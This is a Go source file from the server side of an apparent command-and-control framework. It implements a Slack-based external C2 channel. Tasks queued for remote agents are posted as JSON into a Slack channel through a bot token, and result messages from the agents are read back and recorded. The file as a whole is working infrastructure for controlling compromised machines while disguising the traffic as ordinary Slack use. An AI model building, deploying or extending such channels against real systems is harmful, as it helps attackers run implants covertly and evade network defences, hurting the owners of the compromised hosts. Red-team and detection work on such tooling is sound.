package server

import (
	"encoding/json"
	"log/slog"
	"sync"
	"time"

	"github.com/slack-go/slack"
)

type SlackExternalC2 struct {
	server    *Server
	botToken  string
	channelID string
	client    *slack.Client
	rtm       *slack.RTM
	mu        sync.Mutex
	running   bool
	stopCh    chan struct{}
}

func NewSlackExternalC2(s *Server, botToken, channelID string) *SlackExternalC2 {
	return &SlackExternalC2{
		server:    s,
		botToken:  botToken,
		channelID: channelID,
		stopCh:    make(chan struct{}),
	}
}

func (sc *SlackExternalC2) Start() error {
	sc.mu.Lock()
	if sc.running {
		sc.mu.Unlock()
		return nil
	}
	sc.running = true
	sc.stopCh = make(chan struct{})
	sc.mu.Unlock()

	channelID := "extc2-slack-" + sc.channelID
	slog.Info("Slack External C2 starting", "channel_id", sc.channelID)

	sc.client = slack.New(sc.botToken)

	sc.server.extC2ChannelsMu.Lock()
	sc.server.extC2Channels[channelID] = &extC2WSChannel{
		ID:        channelID,
		Type:      "slack",
		CreatedAt: time.Now(),
	}
	sc.server.extC2ChannelsMu.Unlock()

	go sc.runLoop(channelID)
	return nil
}

func (sc *SlackExternalC2) runLoop(channelID string) {
	wait := 5 * time.Second
	const maxWait = 60 * time.Second
	for {
		sc.connectAndRun(channelID)
		select {
		case <-sc.stopCh:
			slog.Info("Slack External C2 stopped", "channel_id", sc.channelID)
			return
		default:
			slog.Info("Slack External C2 reconnecting", "channel_id", sc.channelID, "wait", wait)
			time.Sleep(wait)
			wait *= 2
			if wait > maxWait {
				wait = maxWait
			}
		}
	}
}

func (sc *SlackExternalC2) connectAndRun(channelID string) {
	sc.rtm = sc.client.NewRTM()
	go sc.rtm.ManageConnection()

	taskSenderDone := make(chan struct{})

	sc.server.extC2TaskMu.Lock()
	sc.server.extC2Notify[channelID] = make(chan struct{}, 1)
	sc.server.extC2TaskMu.Unlock()

	go func() {
		defer close(taskSenderDone)
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-sc.stopCh:
				return
			case <-sc.server.extC2Notify[channelID]:
			case <-ticker.C:
			}
			sc.server.extC2TaskMu.Lock()
			tasks := sc.server.extC2TaskQueue[channelID]
			sc.server.extC2TaskQueue[channelID] = nil
			sc.server.extC2TaskMu.Unlock()
			for _, task := range tasks {
				taskJSON, ok := marshalJSONSafe(task)
				if !ok {
					continue
				}
				_, _, err := sc.client.PostMessage(
					sc.channelID,
					slack.MsgOptionText(string(taskJSON), false),
				)
				if err != nil {
					slog.Error("Slack External C2 send failed", "error", err)
				}
			}
		}
	}()

	for {
		select {
		case <-sc.stopCh:
			sc.rtm.Disconnect()
			<-taskSenderDone
			return
		case event, ok := <-sc.rtm.IncomingEvents:
			if !ok {
				<-taskSenderDone
				return
			}
			switch ev := event.Data.(type) {
			case *slack.MessageEvent:
				if ev.Channel != sc.channelID {
					continue
				}
				if ev.BotID != "" {
					continue
				}
				sc.processMessage(ev.Text, channelID)
			case *slack.ConnectedEvent:
				slog.Info("Slack External C2 connected", "channel_id", sc.channelID)
			case *slack.LatencyReport:
				slog.Debug("Slack External C2 latency", "latency", ev.Value)
			case *slack.DisconnectedEvent:
				slog.Warn("Slack External C2 disconnected", "cause", ev.Cause)
				<-taskSenderDone
				return
			case *slack.AckErrorEvent:
				slog.Warn("Slack External C2 ack error", "error", ev.Error())
			case *slack.RTMError:
				slog.Warn("Slack External C2 RTM error", "error", ev.Error())
				<-taskSenderDone
				return
			}
		}
	}
}

func (sc *SlackExternalC2) processMessage(text, channelID string) {
	var extMsg extC2WSMessage
	if err := json.Unmarshal([]byte(text), &extMsg); err != nil {
		return
	}
	if extMsg.Type == "result" {
		sc.server.processExternalC2Result(extMsg.AgentID, extMsg.TaskID, extMsg.Result)
	}
}

func (sc *SlackExternalC2) Stop() {
	sc.mu.Lock()
	defer sc.mu.Unlock()
	if !sc.running {
		return
	}
	sc.running = false
	close(sc.stopCh)

	channelID := "extc2-slack-" + sc.channelID
	sc.server.extC2ChannelsMu.Lock()
	delete(sc.server.extC2Channels, channelID)
	sc.server.extC2ChannelsMu.Unlock()

	if sc.rtm != nil {
		sc.rtm.Disconnect()
	}
}

func (sc *SlackExternalC2) IsRunning() bool {
	sc.mu.Lock()
	defer sc.mu.Unlock()
	return sc.running
}
